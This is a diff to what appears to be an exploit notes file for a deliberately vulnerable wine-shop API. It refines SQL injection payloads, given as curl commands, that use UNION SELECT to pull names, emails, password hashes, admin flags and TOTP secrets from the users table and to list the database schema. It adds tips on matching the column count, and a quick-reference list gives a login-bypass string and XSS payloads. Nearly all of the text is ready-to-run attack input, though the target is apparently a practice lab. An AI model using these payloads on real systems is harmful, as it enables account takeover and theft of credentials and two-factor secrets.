@@ -30,20 +30,22 @@ How it works:
 Extract all users:
   curl -X POST https://api.taintedport.com/auth/login \
     -H "Content-Type: application/json" \
-    -d '{"email": "'\'' UNION SELECT 1,name,email,password_hash,5,6,7 FROM users--", "password": "x"}'
+    -d '{"email": "'\'' UNION SELECT 1,name,email,password_hash,is_admin,totp_secret,totp_enabled,created_at FROM users--", "password": "x"}'
 
 
 === 2. SQL Injection - Wine Detail (ID) ===
 CWE-89 | High | GET /wines/:id
 
-Payload (extract user credentials via UNION):
-  curl "https://api.taintedport.com/wines/1 UNION SELECT 1,email,password_hash,name,5,6,7,8,9,10,11,12 FROM users--"
+Payload (extract user credentials via UNION - wines table has 15 columns):
+  curl "https://api.taintedport.com/wines/0 UNION SELECT 1,email,password_hash,name,5,6,7,8,totp_secret,is_admin,11,12,13,14,15 FROM users--"
 
 Payload (extract table names):
-  curl "https://api.taintedport.com/wines/1 UNION SELECT 1,name,3,4,5,6,7,8,9,10,11,12 FROM sqlite_master WHERE type='table'--"
+  curl "https://api.taintedport.com/wines/0 UNION SELECT 1,name,type,sql,5,6,7,8,9,10,11,12,13,14,15 FROM sqlite_master--"
 
 How it works:
   The wine ID is concatenated into: SELECT * FROM wines WHERE id = <input>
+  The wines table has 15 columns, so UNION SELECT must have 15 values.
+  Use id=0 (no matching wine) so only the UNION result is returned.
   The route accepts non-numeric values, so arbitrary SQL can be appended.
 
 
@@ -544,7 +546,7 @@ How it works:
 ============================================================
 
 SQLi login bypass:       ' OR 1=1 --
-SQLi wine UNION:         1 UNION SELECT 1,email,password_hash,name,5,6,7,8,9,10,11,12 FROM users--
+SQLi wine UNION:         0 UNION SELECT 1,email,password_hash,name,5,6,7,8,totp_secret,is_admin,11,12,13,14,15 FROM users--
 XSS login email:         <img src=x onerror=alert('XSS')>
 XSS wine search:         <img src=x onerror=alert('XSS')>
 XSS stored name:         <img src=x onerror=alert('XSS')>
